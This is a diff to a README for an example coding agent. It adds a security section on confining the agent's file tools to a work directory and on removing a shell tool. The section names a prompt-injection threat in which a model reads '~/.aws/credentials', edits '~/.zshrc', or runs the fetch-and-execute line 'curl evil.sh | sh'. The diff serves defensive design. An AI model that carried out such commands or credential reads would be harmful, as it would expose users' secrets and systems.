@@ -62,8 +62,10 @@ exercises in CI.
 
 ```bash
 cd examples/coding-agent
+# the hardened tools confine all FS access here and refuse to run without it
+export YAAH_CODING_AGENT_WORKDIR="$PWD/fixtures/buggy_code"
 # the local.json uses {{WORK}} placeholder — point it at the fixture
-sed "s|{{WORK}}|$PWD/fixtures/buggy_code|g" local.json > /tmp/local.resolved.json
+sed "s|{{WORK}}|$YAAH_CODING_AGENT_WORKDIR|g" local.json > /tmp/local.resolved.json
 PYTHONPATH=$PWD:../../src python3 -m yaah.runtime /tmp/local.resolved.json
 # verify the fix
 cd fixtures/buggy_code && python3 test_is_fizzbuzz.py
@@ -160,16 +162,47 @@ For most YAAH applications the answer is "both, at different stages."
 A scout stage might use claude_cli (model-driven, exploratory); the
 fix stage might use LiteLLM with agent_loop (YAAH-driven, controlled).
 
+## Security model (YAAH-driven tools)
+
+The YAAH-side tools (`tools.py`) are **confined to a work directory** named
+by the `YAAH_CODING_AGENT_WORKDIR` environment variable, and **refuse to
+run if it is unset**. This is deliberate: a prompt-injected or adversarial
+model would otherwise call `read_file("~/.aws/credentials")`,
+`edit_file("~/.zshrc", ...)`, or shell out. Confinement defends against:
+
+- path traversal (`../`) and absolute escapes — rejected before any open;
+- symlink-target swap — the final `open()` uses `O_NOFOLLOW`, so a symlink
+  planted at an in-workdir name (e.g. by a malicious `edit_file`) is refused
+  at open time, not just at check time.
+
+`run_tests` runs a **fixed argv** (`[python, <confined test path>]`) with
+`shell=False` — there is no arbitrary-command surface. The original
+`run_bash` was removed: a `shell=True` tool with a model-controlled command
+is one prompt-injection away from `curl evil.sh | sh`, and an env-var gate
+only changes *whether* the footgun exists, not what it does. An author who
+genuinely needs a general shell tool can add one — but should understand
+they are re-opening that hole.
+
+The security contract is pinned by `tests/test_coding_agent_tools_security.py`.
+
+**Residual risk (documented honestly):** a symlink swapped into an
+*intermediate* directory mid-resolution isn't closed by `O_NOFOLLOW` alone
+(that needs `openat2`/`RESOLVE_BENEATH`, not in the Python stdlib). A
+production tool would open the workdir as a dir fd and resolve
+component-by-component. For an example, string containment + final-component
+`O_NOFOLLOW` closes the demonstrated escape.
+
+To run the offline variant by hand, set the env var (the test sets it
+automatically):
+```bash
+export YAAH_CODING_AGENT_WORKDIR="$PWD/fixtures/buggy_code"
+```
+
 ## Honest limits
 
 - The fixture is small. Real bug-fixing across multiple files needs a
   bigger fixture, higher `max_turns`, better prompts. Out of scope for
   "PoC of mechanics."
-- The `run_bash` tool (YAAH-side) is unsandboxed. In production,
-  scope it down via `--allowedTools` (claude_cli) or wrap in a
-  worktree-isolated shell. The example's `run_bash` does enforce a
-  60-second timeout but offers no other sandbox. Claude's native
-  Bash already gates via `--permission-mode`.
 - The fake-tool variant scripts the exact fix flow. If you change the
   bug, the script doesn't adapt — only a real model would.
 - Claude as a YAAH-driven `agent_loop` backend would require an MCP
